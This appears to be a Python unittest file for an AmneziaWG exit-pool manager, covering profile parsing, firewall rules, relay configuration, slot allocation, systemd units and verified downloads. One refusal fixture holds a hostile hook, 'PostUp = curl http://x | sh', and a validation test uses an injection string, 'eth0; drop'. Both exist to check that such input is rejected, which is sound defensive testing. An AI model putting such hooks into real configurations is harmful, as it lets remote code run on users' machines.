#!/usr/bin/env python3
"""AWG exits without Docker: profile checks, instance validation, memory modes, namespace firewall and relay shape,
host access guard, units, downloads. Keys are random test bytes; no real profile, network, root or systemd access."""
import base64
import json
import os
from pathlib import Path
import sys
import unittest
from unittest import mock

SOURCE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SOURCE/'lib'))
import awg_profile as awg  # noqa: E402
import configuration as config  # noqa: E402
import memory_budget as mb  # noqa: E402
import paths  # noqa: E402
import tempfile  # noqa: E402
import time  # noqa: E402


def key():
    return base64.b64encode(os.urandom(32)).decode()


def sample(endpoint='192.0.2.10:51820', extra_interface='', extra_peer='', private=None, allowed='0.0.0.0/0, ::/0'):
    return (f"[Interface]\nAddress = 100.91.8.40/32\nDNS = 100.64.0.1, 8.8.4.4\nPrivateKey = {private or key()}\n"
            "Jc = 6\nJmin = 10\nJmax = 80\nS1 = 856\nS2 = 61\nS3 = 766\nS4 = 12\nH1 = 1\nH2 = 2\nH3 = 3\nH4 = 4\n"
            f"HeaderProtectionKey = {key()}\nRekeyAfterTime = 100-120\nRekeyTimeout = 3-8\n"
            "RejectAfterTime = 150-180\nKeepaliveTimeout = 7-13\nMaxHandshakeAttempts = 15-20\n"
            "ContentPaddingAddition = 10-100\nI1 = <b 0x0102030405><rd 16>\n" + extra_interface +
            f"\n[Peer]\nPublicKey = {key()}\nPresharedKey = {key()}\nAllowedIPs = {allowed}\n"
            f"Endpoint = {endpoint}\nPersistentKeepalive = 25-35\n" + extra_peer)


class ProfileTests(unittest.TestCase):
    def test_facts_and_fingerprint(self):
        private = key()
        facts = awg.parse(sample(private=private))
        self.assertEqual(facts['address4'], '100.91.8.40/32')
        self.assertEqual(facts['dns4'], ['100.64.0.1', '8.8.4.4'])
        self.assertEqual((facts['endpoint_host'], facts['endpoint_port']), ('192.0.2.10', 51820))
        self.assertIsNone(facts['mtu'])
        self.assertTrue(facts['awg'])
        self.assertEqual(facts['fingerprint'], awg.parse(sample(private=private))['fingerprint'])
        self.assertNotEqual(facts['fingerprint'], awg.parse(sample())['fingerprint'])
        self.assertNotIn(private, json.dumps(facts))

    def test_strip_keeps_every_awg_parameter_unchanged(self):
        text = sample(extra_interface='MTU = 1380\nTable = off\n')
        stripped = awg.strip(text)
        for removed in ('Address', 'DNS =', 'MTU', 'Table'):
            self.assertNotIn(removed, stripped)
        kept = [line for line in text.splitlines() if line and line.split('=')[0].strip() not in ('Address', 'DNS', 'MTU', 'Table')]
        for line in kept:
            self.assertIn(line, stripped)
        self.assertEqual(awg.parse(text)['mtu'], 1380)

    def test_apply_comparison_reports_names_only(self):
        text = sample()
        self.assertEqual(awg.missing_after_apply(text, awg.strip(text)+'ListenPort = 40000\nRandomTrailers = off\n'), [])
        changed = awg.strip(text).replace('S3 = 766', 'S3 = 64')
        self.assertEqual(awg.missing_after_apply(text, changed), ['interface.s3'])
        lost = '\n'.join(l for l in awg.strip(text).splitlines() if not l.startswith('PersistentKeepalive'))
        self.assertEqual(awg.missing_after_apply(text, lost), ['peer.persistentkeepalive'])
        # awg resolves host names: only the port is compared.
        named = sample(endpoint='vpn.example.net:9911')
        self.assertEqual(awg.missing_after_apply(named, awg.strip(named).replace('vpn.example.net', '198.51.100.7')), [])

    def test_private_key_compared_in_clamped_form(self):
        raw = bytearray(b'\xff'*32)
        private = base64.b64encode(bytes(raw)).decode()
        raw[0] &= 248; raw[31] = (raw[31] & 127) | 64
        shown_key = base64.b64encode(bytes(raw)).decode()
        text = sample(private=private)
        shown = awg.strip(text).replace(private, shown_key)
        self.assertEqual(awg.missing_after_apply(text, shown), [])
        other = base64.b64encode(b'\x01'*32).decode()
        self.assertEqual(awg.missing_after_apply(text, awg.strip(text).replace(private, other)), ['interface.privatekey'])

    def test_refusals_never_echo_keys(self):
        private = key()
        cases = {
            'two peers': sample(private=private, extra_peer=f'\n[Peer]\nPublicKey = {key()}\nAllowedIPs = 0.0.0.0/0\n'),
            'split tunnel': sample(private=private, allowed='10.0.0.0/8'),
            'script': sample(private=private, extra_interface='PostUp = curl http://x | sh\n'),
            'unknown key': sample(private=private, extra_interface='Foo = bar\n'),
            'ipv6 endpoint': sample(private=private, endpoint='[2001:db8::1]:51820'),
            'bad endpoint': sample(private=private, endpoint='192.0.2.10'),
            'short key': sample(private=base64.b64encode(b'x'*16).decode()),
            'no section': 'PrivateKey = '+private+'\n',
            'ipv6 only': sample(private=private).replace('Address = 100.91.8.40/32', 'Address = fd00::2/128'),
            'control chars': sample(private=private).replace('Jc = 6', 'Jc = 6\x00'),
            'too big': sample(private=private)+'#'*20000,
        }
        for label, text in cases.items():
            with self.subTest(label), self.assertRaises(awg.ProfileError) as caught:
                awg.parse(text)
            self.assertNotIn(private, str(caught.exception))
            self.assertNotIn('curl', str(caught.exception))

    def test_defaults_omitted_by_showconf_are_not_missing(self):
        text = sample(extra_interface='ListenPort = 0\nRandomTrailers = false\n',
                      extra_peer='').replace('PersistentKeepalive = 25-35', 'PersistentKeepalive = 0')
        text = text.replace('Jc = 6', 'Jc = 0').replace('H1 = 1', 'H1 = 1')
        shown = '\n'.join(l for l in awg.strip(text).splitlines()
                          if not l.startswith(('PersistentKeepalive', 'ListenPort', 'Jc', 'H1', 'RandomTrailers')))
        self.assertEqual(awg.missing_after_apply(text, shown), [])
        # A non-default value that disappears is still reported, by name only.
        changed = text.replace('PersistentKeepalive = 0', 'PersistentKeepalive = 25')
        self.assertEqual(awg.missing_after_apply(changed, shown), ['peer.persistentkeepalive'])
        on = text.replace('RandomTrailers = false', 'RandomTrailers = true')
        self.assertEqual(awg.missing_after_apply(on, awg.strip(on).replace('RandomTrailers = true', 'RandomTrailers = on')), [])

    def test_crlf_bom_and_case_insensitive_keys(self):
        text = '﻿'+sample().replace('\n', '\r\n').replace('Endpoint', 'endpoint')
        self.assertEqual(awg.parse(text)['endpoint_port'], 51820)


class InstanceTests(unittest.TestCase):
    def test_awg_defaults_and_mixed_installation(self):
        cfg = config.validate_instances({'de': {'profile_name': 'DE', 'port': 11808},
                                         'fi2': {'kind': 'awg', 'port': 11838, 'slot': 3}})
        self.assertNotIn('kind', cfg['de'])   # Happ entries keep the original format
        self.assertEqual(cfg['fi2'], {'kind': 'awg', 'port': 11838, 'slot': 3, 'tag': 'awg-fi2', 'country': '',
                                      'health_interval': 10, 'failure_threshold': 3, 'memory_mib': 64,
                                      'outbound': 'veth'})
        outbounds = config.make_outbounds(cfg)
        self.assertEqual([o['settings'] for o in outbounds],
                         [{'address': '127.0.0.1', 'port': 11808}, {'address': '10.250.3.2', 'port': 11838}])
        self.assertEqual(outbounds[1]['protocol'], 'socks')
        loop = config.validate_instances({'fi': {'kind': 'awg', 'port': 11838, 'slot': 1, 'outbound': 'loopback'}})
        self.assertEqual(config.relay_address(loop['fi']), '127.0.0.1')

    def test_awg_only_installation_may_be_empty(self):
        self.assertEqual(config.validate_instances({}), {})
        self.assertEqual(config.make_outbounds({}), [])

    def test_awg_rejections(self):
        bad = [{'kind': 'awg', 'port': 11838, 'slot': 1, 'profile_name': 'x'},       # Happ-only field
               {'kind': 'awg', 'port': 11838, 'slot': 1, 'memory_mib': 16},
               {'kind': 'awg', 'port': 11838, 'slot': 1, 'memory_mib': 2048},
               {'kind': 'awg', 'port': 11838, 'slot': 1, 'mtu': 9000},
               {'kind': 'awg', 'port': 11838, 'slot': 1, 'label': 'a\nb'},
               {'kind': 'awg', 'port': 11838, 'slot': 1, 'outbound': 'host'},
               {'kind': 'awg', 'port': 11838, 'slot': 1, 'health_interval': 4},
               {'kind': 'awg', 'port': 11838},                                       # no slot
               {'kind': 'awg', 'port': 11838, 'slot': 251},
               {'kind': 'awg', 'port': 11838, 'slot': '1'},
               {'kind': 'wireguard', 'port': 11838},
               {'kind': 'awg', 'port': 11808, 'slot': 1}]                            # port clash with de
        for item in bad:
            with self.subTest(item), self.assertRaises(ValueError):
                config.validate_instances({'de': {'profile_name': 'DE', 'port': 11808}, 'x': item})
        with self.assertRaises(ValueError):   # two exits in one /30
            config.validate_instances({'a': {'kind': 'awg', 'port': 11838, 'slot': 2},
                                       'b': {'kind': 'awg', 'port': 11848, 'slot': 2}})
        self.assertEqual(config.validate_instances({'x': {'kind': 'awg', 'port': 11838, 'slot': 1,
                                                          'memory_mib': 32}})['x']['memory_mib'], 32)
        nine = {f'h{i}': {'profile_name': 'P', 'port': 12000+i} for i in range(9)}
        with self.assertRaises(ValueError):
            config.validate_instances(nine)

    def test_veth_exits_do_not_need_a_free_host_port(self):
        import socket
        with socket.socket() as busy:
            busy.bind(('127.0.0.1', 0))
            taken = busy.getsockname()[1]
            config.check_ports({'fi': {'kind': 'awg', 'port': taken, 'slot': 1}})
            with self.assertRaises(ValueError):
                config.check_ports({'fi': {'kind': 'awg', 'port': taken, 'slot': 1, 'outbound': 'loopback'}})


class MemoryModeTests(unittest.TestCase):
    def test_modes_order_default_and_texts(self):
        self.assertEqual(mb.AWG_MODES, (32, 64, 128))
        self.assertEqual(mb.AWG_DEFAULT_MODE, 64)
        for text in mb.AWG_MODE_TEXT.values():
            for word in ('Мбит', 'скорост', 'разницы'):
                self.assertNotIn(word, text)
        self.assertEqual(mb.AWG_MODE_TEXT, {32: 'для экономии памяти: при нехватке процессора загрузки могут идти медленнее',
                                             64: 'рекомендуется: баланс памяти и нагрузки на процессор',
                                             128: 'больше запаса памяти для интенсивной нагрузки'})

    def test_web_page_uses_the_same_texts(self):
        script = (SOURCE/'webui'/'app.js').read_text()
        for mode, text in mb.AWG_MODE_TEXT.items():
            self.assertIn(f"[{mode}, '{text}']", script)

    def test_budgets_and_caps(self):
        self.assertEqual([mb.awg_budget(m) for m in (16, 32, 48, 64, 96, 128, 256)], [80, 80, 90, 100, 130, 160, 320])
        self.assertEqual([mb.awg_caps(m) for m in (32, 64, 128, 256)], [(128, 64), (128, 96), (192, 160), (320, 288)])

    def test_plan_pass_warn_fail(self):
        self.assertEqual(mb.plan(300, awg_modes=[64])['status'], 'PASS')     # 100 + 128 <= 300
        self.assertEqual(mb.plan(150, awg_modes=[64])['status'], 'WARN')
        self.assertEqual(mb.plan(90, awg_modes=[64])['status'], 'FAIL')
        three = mb.plan(400, awg_modes=[64, 64, 32])
        self.assertEqual((three['expected'], three['reserve'], three['status']), (280, 128, 'WARN'))
        happ = mb.plan(1000, happ=2, awg_modes=[64], web=True, docker_missing=True)
        self.assertEqual(happ['expected'], 90+512+100+25)
        self.assertEqual(happ['reserve'], 256)

    def test_preflight_memory_verdicts(self):
        import preflight
        fake = lambda args, timeout=20: {'code': 0, 'stdout': '[]' if args[0] == 'ip' else '', 'stderr': ''}
        with mock.patch.object(preflight, 'run', side_effect=fake):
            for available, expected in ((1000, 'PASS'), (150, 'WARN'), (60, 'FAIL')):
                with mock.patch.object(preflight.memory_budget, 'read_memory',
                                       return_value=mb.MemoryBudget(2048, available)):
                    memory = next(c for c in preflight.collect([64])['checks'] if c['check'] == 'memory')
                self.assertEqual(memory['status'], expected)
                self.assertEqual(memory['detail']['hard_caps'], [{'manager_awg_mib': 128, 'relay_mib': 96}])


class RootedTest(unittest.TestCase):
    """A temporary filesystem root for paths/awgnet/access_policy."""
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        paths.set_root(self.root)
        self.addCleanup(paths.set_root, '/')
        (paths.ETC/'instances').mkdir(parents=True)


class AwgnetShapeTests(RootedTest):
    def setUp(self):
        super().setUp()
        import awgnet
        self.awgnet = awgnet
        (paths.ETC/'instances'/'fi.json').write_text(json.dumps({'kind': 'awg', 'port': 11838, 'slot': 7,
                                                                  'country': 'FI', 'memory_mib': 32}))
        self.exit = awgnet.Exit('fi')

    def test_names_and_addresses(self):
        ex = self.exit
        self.assertEqual((ex.ns, ex.tun, ex.hostif, ex.guestif), ('exitpool-fi', 'ep-t7', 'ep-h7', 'ep-n7'))
        self.assertEqual((ex.host, ex.guest, ex.net), ('10.250.7.1', '10.250.7.2', '10.250.7.0/30'))
        self.assertEqual(ex.status['memory_mode'], 32)
        (paths.ETC/'instances'/'de.json').write_text(json.dumps({'profile_name': 'DE', 'port': 11808}))
        with self.assertRaises(self.awgnet.SafeError):
            self.awgnet.Exit('de')

    def test_namespace_firewall_is_fail_closed(self):
        rules = self.exit.nft_rules()
        self.assertIn('table inet exitpool', rules)
        self.assertEqual(rules.count('policy drop'), 3)
        self.assertIn('oifname "ep-t7" accept comment "tunnel"', rules)
        self.assertIn('iifname "ep-n7" ip saddr 10.250.7.1 tcp dport 11838 accept', rules)
        self.assertIn('iifname "ep-n7" ip saddr 10.250.7.1 meta l4proto udp accept', rules)
        self.assertIn('oifname "ep-n7" ip daddr 10.250.7.1 ct direction reply ct state established accept', rules)
        self.assertIn('meta nfproto ipv6 counter drop', rules)
        self.assertNotIn('udp dport 51820', rules)   # the AWG transport lives in the host namespace

    def test_relay_config_prefers_sockopt_and_falls_back(self):
        self.exit.rundir.mkdir(parents=True)
        facts = {'dns4': ['100.64.0.1']}
        results = iter([1, 0])   # the first variant is rejected by `xray run -test`
        with mock.patch.object(self.awgnet, 'run', side_effect=lambda *a, **k: mock.Mock(returncode=next(results))):
            self.exit.write_relay(facts)
        cfg = json.loads((self.exit.rundir/'relay.json').read_text())
        inbound = cfg['inbounds'][0]
        self.assertEqual((inbound['listen'], inbound['port'], inbound['protocol']), ('10.250.7.2', 11838, 'socks'))
        self.assertEqual(inbound['settings'], {'auth': 'noauth', 'udp': True, 'ip': '10.250.7.2'})
        self.assertEqual(cfg['outbounds'][0]['settings'], {'domainStrategy': 'UseIPv4'})   # legacy fallback used
        self.assertEqual(cfg['dns']['servers'], ['100.64.0.1'])
        self.assertEqual((self.exit.rundir/'relay.json').stat().st_mode & 0o777, 0o644)
        self.assertIn('GOMEMLIMIT=32MiB', (self.exit.rundir/'memory.env').read_text())
        with mock.patch.object(self.awgnet, 'run', return_value=mock.Mock(returncode=0)):
            self.exit.write_relay(facts)
        cfg = json.loads((self.exit.rundir/'relay.json').read_text())
        self.assertEqual(cfg['outbounds'][0]['streamSettings'], {'sockopt': {'domainStrategy': 'UseIPv4'}})

    def test_probes_use_relay_or_namespace_and_need_one_success(self):
        seen = []

        def fake_run(argv, **kwargs):
            seen.append(argv)
            body = b'loc=FI\nip=192.0.2.7\n' if '/cdn-cgi/trace' in argv[-1] else b''
            code = b'200' if '/cdn-cgi/trace' in argv[-1] else b'204'
            return mock.Mock(returncode=0, stdout=body+b'\n'+code+b' 0.150')
        with mock.patch.object(self.awgnet.subprocess, 'run', side_effect=fake_run):
            ok, trace, google, mismatch = self.exit.probe(via_relay=True)
            self.assertTrue(ok and not mismatch)
            self.assertEqual((trace['exit_country'], trace['ms']), ('FI', 150))
            ok, _, _, _ = self.exit.probe(via_relay=False)
        relay = [a for a in seen[:2]]
        for argv in relay:
            self.assertEqual(argv[argv.index('--socks5-hostname')+1], '10.250.7.2:11838')
            self.assertEqual(argv[argv.index('--noproxy')+1], '')   # never '*': that skips the proxy
        for argv in seen[2:]:
            self.assertEqual(argv[:4], ['ip', 'netns', 'exec', 'exitpool-fi'])
            self.assertNotIn('--socks5-hostname', argv)

        def one_fails(argv, **kwargs):
            if 'gstatic' in argv[-1]:
                return mock.Mock(returncode=28, stdout=b'')
            return mock.Mock(returncode=0, stdout=b'loc=FI\n\n200 0.2')
        with mock.patch.object(self.awgnet.subprocess, 'run', side_effect=one_fails):
            self.assertTrue(self.exit.probe(True)[0])

        def wrong_country(argv, **kwargs):
            if 'gstatic' in argv[-1]:
                return mock.Mock(returncode=0, stdout=b'\n204 0.1')
            return mock.Mock(returncode=0, stdout=b'loc=DE\n\n200 0.2')
        with mock.patch.object(self.awgnet.subprocess, 'run', side_effect=wrong_country):
            ok, _, _, mismatch = self.exit.probe(True)
        self.assertFalse(ok)
        self.assertTrue(mismatch)


class RemovalRaceTests(RootedTest):
    """purge keeps the network lock to the end and leaves a tombstone, so a late cleanup cannot restore the blackhole."""
    def setUp(self):
        super().setUp()
        import awgnet
        self.awgnet = awgnet
        (paths.ETC/'instances'/'fi.json').write_text(json.dumps({'kind': 'awg', 'port': 11838, 'slot': 2}))
        uapi = mock.patch.object(awgnet, 'UAPI_DIR', self.root/'uapi')   # never the host's /var/run/amneziawg
        uapi.start()
        self.addCleanup(uapi.stop)
        self.calls = []
        patch = mock.patch.object(awgnet, 'run', side_effect=lambda args, **k: self.calls.append([str(a) for a in args])
                                  or mock.Mock(returncode=0, stdout=''))
        patch.start()
        self.addCleanup(patch.stop)

    def blackholes_added(self):
        return [c for c in self.calls if c[:4] == ['ip', 'route', 'replace', 'blackhole']]

    def test_late_cleanup_after_purge_keeps_the_route_removed(self):
        self.awgnet.cleanup('fi')
        self.assertEqual(len(self.blackholes_added()), 1)   # a normal cleanup keeps the blackhole
        self.awgnet.purge('fi')
        self.assertIn(['ip', 'route', 'del', 'blackhole', '10.250.2.0/30', 'metric', '32760'], self.calls)
        self.assertTrue(self.awgnet.tombstone('fi').exists())
        self.calls.clear()
        self.awgnet.cleanup('fi', only_if_dead=True)   # the OnSuccess cleanup queued by the stop arrives late
        self.awgnet.cleanup('fi')
        self.assertEqual(self.blackholes_added(), [])
        self.assertEqual(self.calls, [])

    def test_adding_the_exit_again_clears_the_tombstone(self):
        self.awgnet.purge('fi')
        ex = self.awgnet.Exit('fi')
        with mock.patch.object(self.awgnet.access_policy, 'apply'):
            ex.setup_namespace({'dns4': []})
        self.assertFalse(self.awgnet.tombstone('fi').exists())
        self.assertEqual(len(self.blackholes_added()), 1)


class SlotAllocationTests(RootedTest):
    def routes(self, *items):
        return mock.patch.object(self.ops, 'run', return_value=mock.Mock(stdout=json.dumps(list(items)), returncode=0))

    def setUp(self):
        super().setUp()
        import ops
        self.ops = ops
        ops.set_root(self.root)
        self.addCleanup(ops.set_root, '/')
        installed = mock.patch.object(ops, 'installed', return_value={'fi': {'kind': 'awg', 'slot': 1, 'port': 11838}})
        installed.start()
        self.addCleanup(installed.stop)

    def test_overlaps_block_slots_but_broad_aggregates_do_not(self):
        with self.routes({'dst': 'default', 'gateway': '192.0.2.1'}, {'dst': '10.0.0.0/8', 'dev': 'zt0'}):
            self.assertEqual(self.ops.routes_10_250(), set())
        with self.routes({'dst': '10.250.4.0/24', 'dev': 'wg0'}):
            self.assertEqual(self.ops.routes_10_250(), {4})   # slot N is 10.250.N.0/30
        with self.routes({'dst': '10.250.0.0/16', 'dev': 'tun9'}):
            self.assertEqual(len(self.ops.routes_10_250()), 250)
            with self.assertRaises(self.ops.OpsError):
                self.ops.next_slot({})

    def test_own_blackhole_is_free_foreign_blackhole_is_not(self):
        with self.routes({'type': 'blackhole', 'dst': '10.250.1.0/30', 'metric': 32760},
                         {'type': 'blackhole', 'dst': '10.250.3.0/30', 'metric': 32760},
                         {'dst': '10.250.5.2', 'dev': 'eth1'}):
            self.assertEqual(self.ops.routes_10_250(), {3, 5})

    def test_preflight_subnet_verdicts(self):
        import preflight

        def fake(routes):
            return lambda args, timeout=20: {'code': 0, 'stdout': json.dumps(routes) if args[0] == 'ip' else '', 'stderr': ''}
        cases = (([{'dst': '10.0.0.0/8', 'dev': 'zt0'}], 'WARN', 'шире пула'),
                 ([{'dst': '10.250.0.0/16', 'dev': 'tun9'}], 'FAIL', 'вся 10.250.0.0/16'),
                 ([{'dst': '10.250.9.0/24', 'dev': 'wg0'}], 'WARN', 'свободные /30'),
                 ([{'dst': '10.250.1.0/30', 'dev': 'ep-h1'}, {'type': 'blackhole', 'dst': '10.250.2.0/30'}], 'PASS', 'свободна'))
        for routes, status, text in cases:
            with self.subTest(routes), mock.patch.object(preflight, 'run', side_effect=fake(routes)):
                check = next(c for c in preflight.collect([])['checks'] if c['check'] == 'subnet')
            self.assertEqual(check['status'], status)
            self.assertIn(text, check['text'])


class WaitRunningTests(RootedTest):
    def setUp(self):
        super().setUp()
        import ops
        self.ops = ops
        ops.set_root(self.root)
        self.addCleanup(ops.set_root, '/')
        (ops.ETC/'instances'/'fi.json').write_text(json.dumps({'kind': 'awg', 'port': 11838, 'slot': 1}))
        sleep = mock.patch.object(ops.time, 'sleep')
        sleep.start()
        self.addCleanup(sleep.stop)

    def test_unit_that_keeps_failing_before_writing_status_is_reported_fast(self):
        states = iter([{'ActiveState': 'activating', 'NRestarts': str(n)} for n in range(10)])
        with mock.patch.object(self.ops, 'units', side_effect=lambda names: {'fi': next(states)}):
            self.assertEqual(self.ops.wait_running('fi', time.time(), timeout=60), 'failed')
        with mock.patch.object(self.ops, 'units', return_value={'fi': {'ActiveState': 'failed'}}):
            self.assertEqual(self.ops.wait_running('fi', time.time(), timeout=60), 'failed')

    def test_fresh_running_status_wins(self):
        (self.ops.VAR/'fi').mkdir(parents=True)
        (self.ops.VAR/'fi'/'status.json').write_text(json.dumps({'started_at': time.time()+1, 'phase': 'running',
                                                                  'healthy': True}))
        with mock.patch.object(self.ops, 'units', return_value={'fi': {'ActiveState': 'active', 'NRestarts': '0'}}):
            self.assertEqual(self.ops.wait_running('fi', time.time(), timeout=60), 'running')


class AccessPolicyTests(RootedTest):
    def setUp(self):
        super().setUp()
        import access_policy
        self.policy = access_policy

    def test_default_denies_forwarding_to_exit_veths(self):
        text = self.policy.render(self.policy.load())
        self.assertIn('type filter hook forward priority -5; policy accept;', text)
        self.assertIn('oifname "ep-h*" counter drop', text)
        self.assertNotIn('accept comment', text)
        self.assertNotIn('ct state established', text)

    def test_allow_one_container_network_before_the_drop(self):
        commands = []

        def fake(args, **kwargs):
            commands.append((args, kwargs.get('input')))
            return mock.Mock(returncode=1 if args[:2] == ['nft', 'list'] else 0, stdout='', stderr='')
        with mock.patch.object(self.policy.subprocess, 'run', side_effect=fake):
            self.policy.allow('br-3xui', '172.20.0.5/16')
        saved = json.loads((paths.ETC/'access.json').read_text())
        self.assertEqual(saved['allowed_container_networks'], [{'interface': 'br-3xui', 'subnet': '172.20.0.0/16'}])
        self.assertEqual((paths.ETC/'access.json').stat().st_mode & 0o777, 0o600)
        script = commands[-1][1]
        self.assertNotIn('delete table', script)   # the table did not exist yet
        self.assertLess(script.index('iifname "br-3xui" ip saddr 172.20.0.0/16 oifname "ep-h*" counter accept'),
                        script.index('oifname "ep-h*" counter drop'))
        for bad in ('eth0; drop', 'x'*16):
            with self.assertRaises(ValueError):
                self.policy.validate([{'interface': bad, 'subnet': '10.0.0.0/8'}])
        with self.assertRaises(ValueError):
            self.policy.validate([{'interface': 'br0', 'subnet': 'fd00::/8'}])


class UnitTests(unittest.TestCase):
    def unit(self, name):
        return (SOURCE/'systemd'/name).read_text()

    def test_exit_unit_cleans_outside_its_cgroup(self):
        text = self.unit('exitpool-awg@.service')
        for line in ('OnFailure=exitpool-awg-cleanup@%i.service', 'Restart=on-failure',
                     'ExecStartPre=/usr/bin/python3 /opt/exitpool/lib/awgnet.py cleanup %i',
                     'ExecStart=/usr/bin/python3 /opt/exitpool/lib/awgnet.py run %i', 'OOMScoreAdjust=500'):
            self.assertIn(line, text)
        self.assertNotIn('ExecStopPost', text)
        self.assertIn('cleanup-if-dead', self.unit('exitpool-awg-cleanup@.service'))

    def test_relay_is_unprivileged_inside_the_namespace(self):
        text = self.unit('exitpool-awg-relay@.service')
        for line in ('DynamicUser=yes', 'NetworkNamespacePath=/run/netns/exitpool-%i',
                     'ExecStart=/opt/exitpool/bin/xray run -c /run/exitpool/%i/relay.json'):
            self.assertIn(line, text)
        self.assertNotIn('AmbientCapabilities', text)


class FetchTests(RootedTest):
    def setUp(self):
        super().setUp()
        import fetch
        self.fetch = fetch

    def test_proxy_forms_and_masking(self):
        p = self.fetch.parse_proxy('http://us%40er:p%3Ass@proxy.example:3128')
        self.assertEqual((p['url'], p['user'], p['password']), ('http://proxy.example:3128', 'us@er', 'p:ss'))
        self.assertEqual(self.fetch.masked(p), 'http://us@er:***@proxy.example:3128')
        self.assertEqual(self.fetch.parse_proxy('socks5h://127.0.0.1:1080')['user'], None)
        self.assertEqual(self.fetch.full_url(p), 'http://us%40er:p%3Ass@proxy.example:3128')
        for bad in ('127.0.0.1:1080', 'ftp://h:21', 'socks5://host', 'http://:3128'):
            with self.assertRaises(self.fetch.FetchError):
                self.fetch.parse_proxy(bad)

    def test_password_only_in_private_config(self):
        seen = {}

        def fake(argv, **kwargs):
            config = Path(argv[argv.index('-K')+1])
            seen.update(argv=argv, mode=config.stat().st_mode & 0o777, text=config.read_text(), path=config)
            return mock.Mock(returncode=7, stderr='curl: (7) Failed to connect to proxy.example port 3128: secret-pass')
        proxy = self.fetch.parse_proxy('http://user:secret-pass@proxy.example:3128')
        with mock.patch.object(self.fetch.subprocess, 'run', side_effect=fake):
            ok, error = self.fetch.curl('https://github.com/', self.root/'out', proxy)
        self.assertFalse(ok)
        self.assertNotIn('secret-pass', ' '.join(seen['argv']))
        self.assertNotIn('secret-pass', error)
        self.assertIn('Failed to connect', error)
        self.assertEqual(seen['mode'], 0o600)
        self.assertIn('proxy-user = "user:secret-pass"', seen['text'])
        self.assertFalse(seen['path'].exists())
        with mock.patch.object(self.fetch.subprocess, 'run', side_effect=fake):
            self.fetch.curl('https://github.com/', self.root/'out', None)
        self.assertIn('noproxy = "*"', seen['text'])

    def test_binaries_checked_against_manifest(self):
        source = self.root/'bins'
        source.mkdir()
        files = {}
        for name in paths.AWG_BINARIES:
            (source/name).write_bytes(name.encode())
            files[name] = {'sha256': self.fetch.sha256(source/name)}
        manifest = self.root/'binaries.json'
        manifest.write_text(json.dumps({'base_url': 'https://example.invalid/', 'files': files}))
        with mock.patch.object(self.fetch, 'MANIFEST', manifest):
            self.assertEqual(set(self.fetch.check_dir(source).values()), {'release'})
            self.fetch.install_from_dir(source, progress=lambda t: None)
            self.assertEqual((paths.BIN/'xray').read_bytes(), b'xray')
            self.assertEqual((paths.BIN/'xray').stat().st_mode & 0o777, 0o755)
            (source/'awg').write_bytes(b'tampered')
            self.assertEqual(self.fetch.check_dir(source)['awg'], 'local')
            with self.assertRaises(self.fetch.FetchError):
                self.fetch.install_from_dir(source, progress=lambda t: None)
            self.fetch.install_from_dir(source, strict=False, progress=lambda t: None)   # own build, confirmed
            self.assertEqual((paths.BIN/'awg').read_bytes(), b'tampered')
            (source/'awg').unlink()
            self.assertEqual(self.fetch.check_dir(source)['awg'], 'missing')

    def test_download_error_is_the_real_reason(self):
        with mock.patch.object(self.fetch, 'curl', return_value=(False, 'curl: (6) Could not resolve host: github.com')):
            with self.assertRaises(self.fetch.FetchError) as caught:
                self.fetch.download_files(self.root, None, progress=lambda t: None)
        self.assertIn('Could not resolve host', str(caught.exception))
        self.assertIn('github.com', str(caught.exception))

    def test_saved_proxy_is_private(self):
        proxy = self.fetch.parse_proxy('socks5h://u:p@127.0.0.1:1080')
        self.fetch.save_proxy(proxy)
        self.assertEqual((paths.ETC/'proxy.json').stat().st_mode & 0o777, 0o600)
        self.assertEqual(self.fetch.load_saved_proxy(), proxy)
        self.fetch.clear_proxy()
        self.assertIsNone(self.fetch.load_saved_proxy())


if __name__ == '__main__':
    unittest.main()
